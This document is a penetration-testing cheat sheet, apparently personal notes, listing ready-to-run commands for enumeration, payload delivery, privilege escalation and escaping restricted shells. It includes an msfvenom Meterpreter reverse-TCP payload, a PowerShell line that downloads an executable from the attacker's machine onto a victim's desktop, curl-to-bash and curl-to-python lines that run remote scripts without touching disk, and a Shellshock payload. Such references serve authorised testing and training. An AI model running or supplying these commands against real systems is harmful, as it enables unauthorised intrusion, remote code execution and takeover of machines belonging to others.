## Enum
* `nmap -Pn -n -p- -sT --min-rate 5000 {ip}` _Quick nmap all ports_
* `nmap -Pn -n -p- -sV -A {ip}` _Slow nmap all info_
* `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://{site} -r -t {n} -o gobuster.txt ` _Gobuster scan for folders with n threads_
* `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://{site} -r -t {n} -x php,asp,aspx,html -o gobuster_aspx.txt` _Gobuster scan for pages with n threads_

## Exploit
* `python -m SimpleHTTPServer 80` _Start web server on kali in current dir_
* `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe >m.exe` _Make a standard meterpreter exe_

## Priv Esc Windows
* `powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://{kali_ip}:8080/m.exe', 'c:\users\victim\desktop\m.exe') }"` _Powershell download a file_
* `systeminfo >systeminfo.txt` _Export sysinfo from windows
* `python windows-exploit-suggester.py --database 2018-09-06-mssb.xls --systeminfo sysinfo.txt` _Use exported sysinfo file to check for possible exploits using this tool https://github.com/GDSSecurity/Windows-Exploit-Suggester.git_
* `python windows-exploit-suggester.py --update` _Get new database file for exploit suggester_

## Pric Esc Linux
* `curl {kali_ip}:{port}/LinEnum.sh | /bin/bash` _Run linux enum script without dropping it on disk_
* `curl {kali_ip}:{port}/linuxprivchecker.py | python` _Run linux priv checker without dropping it on disk_
* `/sbin/getcap -r / 2>/dev/null` _Search filesytem for files with special capabilities.  Similar to suid_

## Pric Esc Generic
* `run post/multi/recon/local_exploit_suggester` _Check for local priv esc exploits.  Must be interacting with meterpreter session_

## Break out of limited shell 
**(Credit Gos Here https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)**
* `env` _Check environmential variables_
* `echo $PATH` _Check path for executables_
* `echo $SHELL` _What shell is in use_
* `/bin/sh` _Just run new shell_
* `export PATH=/bin:/usr/bin:$PATH` _Just add folders to PATH_
* `export SHELL=/bin/sh` _Just change shell_
* `cp /bin/sh /some/dir/from/PATH; sh` _Copy sh to a runable folder and launch it_
* `ftp, gdb, more, less, man, vi, vim, scp, awk, find` _Can all launch shells_
* `ssh restricted@x.x.x.x -t "/bin/sh"` _Execute /bin/sh before remote shell is loaded_
* `ssh restricted@x.x.x.x -t "bash --noprofile"` _Start remote shell without loading rc profile_
* `ssh restricted@x.x.x.x -t "() { :; }; /bin/bash"` _Try shell shock_
* `python -c 'import os; os.system("/bin/bash")'` _Launch shell with python_
* `perl -e 'exec "/bin/sh";'` _Launch shell with perl_